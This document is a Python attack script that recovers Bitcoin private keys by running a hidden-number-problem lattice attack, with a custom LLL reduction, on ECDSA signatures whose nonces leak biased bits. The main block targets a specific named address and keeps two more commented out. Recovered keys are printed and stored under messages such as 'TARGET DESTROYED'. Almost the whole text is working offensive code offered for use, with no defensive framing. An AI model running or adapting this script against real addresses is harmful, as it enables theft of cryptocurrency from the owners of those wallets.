import json
import sys
import mpmath
from ecdsa import SECP256k1
from lattice_nonce_analyzer import verify_key
from db_manager import add_recovered_key

P = SECP256k1.order
mpmath.mp.prec = 1024

def fast_lll(basis, delta=0.99):
    n = len(basis)
    m = len(basis[0])
    
    basis = [[mpmath.mpf(x) for x in row] for row in basis]
    B_star = [[mpmath.mpf(0)] * m for _ in range(n)]
    mu = [[mpmath.mpf(0)] * n for _ in range(n)]
    d = [mpmath.mpf(0)] * n

    # Initial orthogonalization
    print("Initial orthogonalization...", end="")
    for i in range(n):
        B_star[i] = list(basis[i])
        for j in range(i):
            num = sum(basis[i][k] * B_star[j][k] for k in range(m))
            mu[i][j] = num / d[j] if d[j] != 0 else mpmath.mpf(0)
            for k in range(m):
                B_star[i][k] -= mu[i][j] * B_star[j][k]
        d[i] = sum(x*x for x in B_star[i])
    print(" Done!")

    k = 1
    print("Running LLL reduction...", end="")
    while k < n:
        if k % 10 == 0:
            print(".", end="")
            sys.stdout.flush()
            
        # Size reduction
        for j in range(k-1, -1, -1):
            if abs(mu[k][j]) > 0.5:
                q = round(mu[k][j])
                for l in range(m):
                    basis[k][l] -= q * basis[j][l]
                
                # Update mu[k][...]
                for idx in range(j):
                    mu[k][idx] -= q * mu[j][idx]
                mu[k][j] -= q
                
        # Lovasz condition
        if d[k] >= (delta - mu[k][k-1]**2) * d[k-1]:
            k += 1
        else:
            # Swap k and k-1
            basis[k], basis[k-1] = basis[k-1], basis[k]
            
            mu_k_km1 = mu[k][k-1]
            B_star_k_new = [B_star[k][l] + mu_k_km1 * B_star[k-1][l] for l in range(m)]
            d_k_new = sum(x*x for x in B_star_k_new)
            
            mu_new = mu_k_km1 * d[k-1] / d_k_new if d_k_new != 0 else mpmath.mpf(0)
            B_star_km1_new = [B_star[k-1][l] - mu_new * B_star_k_new[l] for l in range(m)]
            d_km1_new = sum(x*x for x in B_star_km1_new)
            
            # Update mu for i > k
            c_star_norm = d[k]
            for i in range(k+1, n):
                mu_i_km1 = mu[i][k-1]
                mu_i_k = mu[i][k]
                
                mu[i][k-1] = mu_i_km1 * mu_new + mu_i_k * (c_star_norm / d_k_new if d_k_new != 0 else 0)
                mu[i][k] = mu_i_km1 - mu_k_km1 * mu_i_k
                
            # Update mu for j < k-1
            for j in range(k-1):
                mu[k-1][j], mu[k][j] = mu[k][j], mu[k-1][j]
                
            mu[k][k-1] = mu_new
            B_star[k-1] = B_star_k_new
            B_star[k] = B_star_km1_new
            d[k-1] = d_k_new
            d[k] = d_km1_new
            
            k = max(k-1, 1)
    
    print(" Done!")
    return basis

def nuke_sigs(address, sigs, d_mod, bits, max_sigs=35):
    print(f"\n{'='*60}")
    print(f"NUKING {address}")
    print(f"Bias: {bits} bits | d_mod: {d_mod} | max_sigs: {max_sigs}")
    print(f"{'='*60}")

    mod = 1 << bits
    inv_mod = pow(mod, -1, P)
    
    prepared = []
    for s in sigs:
        try:
            s_inv = pow(s['s'], -1, P)
            u = (s_inv * s['z']) % P
            t = (s_inv * s['r']) % P
            
            a = (u + t * d_mod) % mod
            u_prime = ((u + t * d_mod - a) * inv_mod) % P
            t_prime = t
            prepared.append({'u': u_prime, 't': t_prime})
        except: continue

    n = min(len(prepared), max_sigs)
    if n < 2:
        print("Not enough signatures.")
        return

    B = 1 << (256 - bits)
    
    matrix = [[0] * (n + 2) for _ in range(n + 2)]
    for i in range(n): matrix[i][i] = P
    for i in range(n): matrix[n][i] = prepared[i]['t']
    matrix[n][n] = 1
    for i in range(n): matrix[n+1][i] = prepared[i]['u']
    matrix[n+1][n+1] = B
    
    print(f"Constructed {n+2}x{n+2} lattice. Running fast LLL...")
    reduced = fast_lll(matrix)
    
    print("Top 5 shortest vector lengths (log2):")
    for i in range(min(5, len(reduced))):
        length = mpmath.sqrt(sum(x**2 for x in reduced[i]))
        print(f"  v{i}: {mpmath.log(length, 2)}")

    for row in reduced:
        last_val = int(row[n+1])
        if abs(last_val) != int(B):
            continue # Not our target vector
            
        d_prime = int(row[n])
        if last_val == -int(B):
            d_prime = -d_prime
            
        if d_prime < 0:
            d_prime = (d_prime % P + P) % P
            
        # d = 2^bits * d' + d_mod
        d = (d_prime * mod + d_mod) % P
        if verify_key(d, address):
            print(f"\n!!! TARGET DESTROYED !!!")
            print(f"Address:     {address}")
            print(f"Private Key: {hex(d)}")
            add_recovered_key(address, hex(d), method=f'HNP LLL ({bits}-bit LSB)')
            return d

    print("Strike failed. Target survived.")
    return None

def nuke(address, sigs_file, d_mod, bits, max_sigs=35):
    with open(sigs_file, 'r') as f:
        sigs = json.load(f)
    return nuke_sigs(address, sigs, d_mod, bits, max_sigs)

if __name__ == "__main__":
    # Target 1: 15Z5YJaa (16 bits, need n > 30 for gap)
    nuke("15Z5YJaaNSxeynvr6uW6jQZLwq3n1Hu6RX", "sigs_15Z5YJaa_all.json", 51496, 16, 35)
    
    # Commented out to stay within execution timeout limits
    # nuke("1FdPpELnjHfwSM4Nvi7LdYS4S4GVGsLUQY", "sigs_1FdPpELn.json", 54389, 17, 35)
    # nuke("1HDNfSr5ExyGfe77GX681PPZtN2deoewfd", "sigs_1HDNfSr5.json", 6485, 14, 40)
